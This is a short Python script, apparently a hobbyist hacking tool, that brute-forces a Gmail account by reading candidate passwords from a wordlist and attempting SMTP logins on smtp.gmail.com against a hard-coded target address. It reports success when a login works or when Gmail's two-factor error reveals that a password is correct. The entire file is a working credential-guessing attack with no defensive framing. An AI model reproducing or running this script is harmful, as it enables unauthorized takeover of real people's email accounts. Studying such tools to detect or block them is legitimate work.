import smtplib

RED,END =  '\033[1;91m','\033[0m'

target = 'msztdeku88@gmail.com' #Target gmail address

mail = smtplib.SMTP("smtp.gmail.com", 587)

mail.ehlo()  

mail.starttls() 

password_count = 0    

BANNER=("""

  _    __  _        _   ___  ___     
 | |_ /  \| |_ __ _| |_( _ )( _ )_ _ 
 | ' \ () |  _/ _` | / / _ \/ _ \ '_|
 |_||_\__/ \__\__,_|_\_\___/\___/_|  
                                     
""")

try : 
    print(RED+BANNER+END)
    print(RED + '[+] Brute force started' + END)

    for password in open('passwords.txt','r',encoding='utf-8').readlines():
        
        try : 
            
            password_count += 1
            
            print( f'\rTried password number => {password_count}\r',end='')
          
            mail.login(target,password)

            print('Password Found =>',password)
            
            print(RED+"🙌 THAT'S IT !,YOU'RE DONE "+END)
            
            break
        
        except  smtplib.SMTPAuthenticationError as error  : 
            
            two_factor =  'Application-specific password required.'
            
            if two_factor in str(error) :  
                
                print(RED + 'Password Found but need 2FA. ' + END)
                
                print( RED + 'Password =>',password + END )
                
                print(RED+"🙌 THAT'S IT !,YOU'RE DONE "+END)

                break 
            
            else :
                
                pass

        
except FileNotFoundError : 
    
    print('Check your passw.txt file location and try again.')

mail.close()
